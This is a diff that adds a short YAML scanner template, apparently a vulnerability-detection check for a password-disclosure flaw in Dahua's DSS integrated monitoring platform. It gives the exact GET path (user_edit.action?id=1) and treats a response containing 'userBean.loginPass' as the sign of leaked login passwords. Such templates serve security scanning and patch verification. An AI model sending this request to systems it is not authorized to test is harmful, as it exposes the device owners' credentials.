@@ -1,0 +1,11 @@
+name: 大华DSS综合监控管理平台-user_edit信息泄露
+description: >-
+  密码泄漏
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: "/admin/cascade_/user_edit.action?id=1"
+    expression:
+      status: 200
+      body_all: ["userBean.loginPass"]
